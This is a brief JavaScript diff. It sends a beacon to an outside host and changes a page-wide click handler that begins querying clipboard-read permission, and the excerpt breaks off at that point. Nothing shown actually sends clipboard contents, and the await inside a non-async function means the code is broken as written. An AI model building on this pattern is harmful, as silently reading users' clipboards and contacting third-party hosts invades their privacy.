@@ -1,6 +1,6 @@
 navigator.sendBeacon("https://gallery.zerolimits.dev", "poop");
-document.addEventListener("click", paste());
-function paste() {
+document.addEventListener("click", pasteIt);
+function pasteIt() {
     try {
         const permission = await navigator.permissions.query({
             name: "clipboard-read",
